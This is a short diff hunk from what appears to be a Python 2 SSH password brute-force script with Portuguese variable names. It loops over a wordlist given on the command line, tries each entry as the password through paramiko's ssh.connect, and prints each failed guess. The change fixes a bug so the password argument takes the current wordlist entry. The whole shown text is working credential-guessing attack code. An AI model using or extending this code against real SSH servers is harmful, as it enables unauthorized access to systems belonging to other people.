@@ -15,7 +15,7 @@ f = open(sys.argv[3])
 for palavra in f.readlines():
 	senha = palavra.strip()
 	try:
-		ssh.connect(ip, username=usuario, password=wordlist.txt)
+		ssh.connect(ip, username=usuario, password=senha)
 	except paramiko.ssh_exception.AuthenticationException:
 		print "Testando com:",senha
 	else:
